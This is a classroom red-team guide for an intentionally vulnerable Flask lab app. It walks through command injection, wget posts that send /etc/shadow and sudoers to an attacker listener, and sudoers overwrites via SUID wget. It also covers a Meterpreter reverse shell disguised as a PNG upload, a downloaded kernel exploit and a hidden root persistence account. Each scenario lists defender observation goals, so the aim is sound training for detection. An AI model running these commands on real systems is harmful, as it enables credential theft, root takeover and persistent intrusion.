# FlaskVA Red-Team Practice

This guide is for authorized Hullu lab practice only. Run the scenarios from an isolated attacker VM, such as Kali, against your own Hullu VM. The purpose is to help students understand what attack activity looks like so they can later investigate it with Wazuh, Suricata, and host evidence.

## How to Use This Guide

Before each scenario:

- Confirm the lab is isolated and that you are using your own Hullu VM.
- Record the attacker IP, Hullu IP, date, start time, and the scenario name.
- Take a VM snapshot if you want a clean reset after the exercise.
- Decide what a defender should be able to observe before running the commands.

During each scenario:

- Run one scenario at a time so the evidence is easy to explain later.
- Save terminal output, screenshots, payload names, ports, URLs, and timestamps.
- Note every file written, permission changed, account created, and outbound connection made.

After each scenario:

- Collect logs, alerts, packet captures, and changed files before cleanup.
- Write down which events should become Wazuh alerts or file-integrity findings in the later blue-team lab.
- Clean up the artifacts or revert the VM snapshot.

## Sample Scenarios (tested in Kali)

### Privilege escalation via SUID wget (working in Hullu3)

Assumption: FlaskVA runs via `flaskva` account, command injection works, and `wget` has SUID enabled.

#### About the SUID `wget` misconfiguration

In this lab, `/usr/bin/wget` may be intentionally misconfigured with the SUID bit. That means `wget` runs with the file owner's privileges, usually `root`, instead of only the privileges of the current user. You can identify the misconfiguration when the permissions include `s`, for example:

```sh
-rwsr-xr-x 1 root root ... /usr/bin/wget
```

On a normal hardened system, `wget` should not be SUID. In Hullu, this misconfiguration is included for isolated privilege-escalation practice, such as writing a lab sudoers drop-in file or reading protected files after you already have command execution.

#### 1. Password hash extraction and cracking

Defence question: what should Wazuh or host logs show when a web application process reads sensitive account files and sends them to another host?

- Confirm command execution in `http://<Hullu-IP>:5000/command`:

    ```sh
    127.0.0.1; whoami
    127.0.0.1; id
    127.0.0.1; pwd
    127.0.0.1; ls
    127.0.0.1; find / -perm -4000 -type f 2>/dev/null
    127.0.0.1; ls -l /usr/bin/wget
    ```

- Send `/etc/passwd` to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/passwd
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/passwd http://192.168.8.10:8000/ -O /dev/null
    ```

- Send `/etc/shadow` to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/shadow
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/shadow http://192.168.8.10:8000/ -O /dev/null
    ```

- Crack captured hashes

    ```sh
    cd ~/Desktop
    unshadow passwd shadow > hashes.txt
    john hashes.txt
    ```

#### 2. Privilege escalation

Defence question: what should a defender see when a low-privileged web account gains passwordless sudo access?

##### Method A: Add sudoers drop-in file to `/etc/sudoers.d/`
- Prepare sudoers payload on Kali:

    ```sh
    echo 'flaskva ALL=(ALL) NOPASSWD: ALL' > flaskva
    python3 -m http.server 8000
    ```

- Write it with SUID `wget`:

    ```sh
    127.0.0.1; wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva; chmod 440 /etc/sudoers.d/flaskva
    ```

- Test root access:

    ```sh
    127.0.0.1; sudo -n id
    ```

    To re-practice it, remove the `flaskva` sudoers file

    ```sh
    127.0.0.1; sudo rm /etc/sudoers.d/flaskva
    ```

##### Method B: Update `/etc/sudoers` file
- Send the current `/etc/sudoers` file to Kali Desktop.

    On Kali:

    ```sh
    nc -lvnp 8000 > ~/Desktop/sudoers
    ```

    In FlaskVA command injection:

    ```sh
    127.0.0.1; wget --post-file=/etc/sudoers http://192.168.8.10:8000/ -O /dev/null
    ```

- On Kali, open `~/Desktop/sudoers`, remove any HTTP headers at the top if they exist, then add this line near the end:

    ```sh
    flaskva ALL=(ALL) NOPASSWD: ALL
    ```

- Host the modified sudoers file from Kali:

    ```sh
    cd ~/Desktop
    python3 -m http.server 8000
    ```

- Overwrite `/etc/sudoers` with SUID `wget`:

    ```sh
    127.0.0.1; wget http://192.168.8.10:8000/sudoers -O /etc/sudoers; chmod 440 /etc/sudoers
    ```

- Test root access:

    ```sh
    127.0.0.1; sudo -n id
    ```

- To re-practice it, remove the added line:

    ```sh
    127.0.0.1; sudo sed -i '/flaskva/d' /etc/sudoers
    ```

#### Defender observation goals

- Web request containing command-injection syntax.
- Discovery commands such as `whoami`, `id`, `pwd`, `ls`, `find`, and `ls -l /usr/bin/wget`.
- Outbound HTTP connections from Hullu to Kali.
- Sensitive file access involving `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, or `/etc/sudoers.d/`.
- Privilege change evidence from `sudo -n id`.
- File-integrity changes under `/etc/sudoers.d/` or `/etc/sudoers`.

### Meterpreter session via disguised ELF upload (working in Hullu3)

Assumption: FlaskVA upload and command injection are available.

#### Steps

1. Upload a normal PNG/photo first from `http://<Hullu-IP>:5000/upload`. The page shows a preview; open the preview image in a new tab to see the upload path, such as `static/uploads/<filename>`.

2. Create the ELF payload on Kali, then rename it to an allowed upload extension:

    ```sh
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.8.10 LPORT=5555 -f elf -o shell.elf
    mv shell.elf shell.png
    ```

3. Start the Metasploit handler on Kali:

    ```sh
    msfconsole
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST 192.168.8.10
    set LPORT 5555
    run
    ```

4. Upload `shell.png` from `http://<Hullu-IP>:5000/upload`.

5. Rename it back and make it executable from `http://<Hullu-IP>:5000/command`:

    ```sh
    127.0.0.1; mv static/uploads/shell.png static/uploads/shell.elf
    127.0.0.1; ls -l static/uploads/shell.elf
    127.0.0.1; chmod +x static/uploads/shell.elf
    127.0.0.1; ls -l static/uploads/shell.elf
    ```

6. Run the ELF from the command page:

    ```sh
    127.0.0.1; static/uploads/shell.elf
    ```

7. Check the session in Meterpreter:

    ```sh
    getuid
    sysinfo
    shell
    ```

8. Check if the Wget misconfiguration is available:

    ```sh
    ls -l /usr/bin/wget
    ```

    If the Wget misconfiguration exists, create the sudoers drop-in file in a new Kali terminal and start a web server:

    ```sh
    echo 'flaskva ALL=(ALL) NOPASSWD: ALL' > flaskva
    python3 -m http.server 8000
    ```

    In the Meterpreter session, download the lab sudoers drop-in file from Kali and test `sudo`:

    ```sh
    sudo -n id
    wget http://192.168.8.10:8000/flaskva -O /etc/sudoers.d/flaskva
    sudo -n id
    ```

    If the Wget misconfiguration is not available, move to `CVE-2026-31431 CopyFail Vulnerability`.

#### Defender observation goals

- Upload of a file with an image extension that later behaves like an executable.
- Rename from `shell.png` to `shell.elf`.
- Permission change using `chmod +x`.
- Execution from the web upload directory.
- Reverse TCP connection from Hullu to Kali on the selected listener port.
- Process activity and command shell activity spawned by the payload.

### CVE-2026-31431 CopyFail Vulnerability

- CopyFail is a Linux local privilege escalation vulnerability. Use this only after you already have authorized code execution in your own Hullu lab VM.

- References:
  - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-31431
  - Microsoft Security Blog: https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/
  - CopyFail project page: https://copy.fail/

- Lab prerequisites:
  - Python 3.10 or newer
  - A vulnerable Linux kernel
  - AF_ALG support enabled
  - A readable SUID binary target, such as `/usr/bin/su`

- Apply the CopyFail vulnerability in the lab:
  ```sh
  cd /tmp
  wget https://raw.githubusercontent.com/kaledaljebur/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py
  python3 /tmp/copy_fail_exp.py
  id
  ```

#### Defender observation goals

- Download of an exploit script into `/tmp`.
- Python execution from a writable temporary directory.
- Privilege change after exploit execution.
- Access to SUID targets such as `/usr/bin/su`.
- Any kernel, audit, or Wazuh events that indicate local privilege-escalation behavior.

### Lab-only persistence account practice

- In any of the above lab sessions, you can practice creating a root-level persistence account inside the disposable Hullu VM:
  ```sh
  { echo -e "aaa\naaa" | sudo adduser -G wheel james && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
  ```

  For example, in the command injection page in `FlaskVA`, the command can be:

  ```sh
  127.0.0.1; { echo -e "aaa\naaa" | sudo adduser -G wheel james && sudo echo '%wheel ALL=(ALL) ALL' >> /etc/sudoers; } >/dev/null 2>&1
  ```

- Or use this, which avoids adding a duplicate line to `/etc/sudoers`:
  ```sh
  { echo -e "aaa\naaa" | sudo adduser -G wheel james && (sudo grep -qxF '%wheel ALL=(ALL) ALL' /etc/sudoers || echo '%wheel ALL=(ALL) ALL' | sudo tee -a /etc/sudoers); } >/dev/null 2>&1
  ```

#### Defender observation goals

- New local account creation for `james`.
- Group membership change involving `wheel`.
- Modification of `/etc/sudoers`.
- Authentication attempts or successful login using the new account.
- Cleanup evidence when the account and sudoers change are removed.

## Student Evidence Notes Template

Use this short template after each scenario so the later Wazuh lab has clear material to investigate.

```text
Scenario:
Attacker IP:
Hullu IP:
Start time:
End time:
Commands or actions performed:
Files created or changed:
Network connections observed:
Privilege changes observed:
Expected Wazuh events or alerts:
Expected Suricata/network evidence:
Cleanup performed:
Open questions:
```
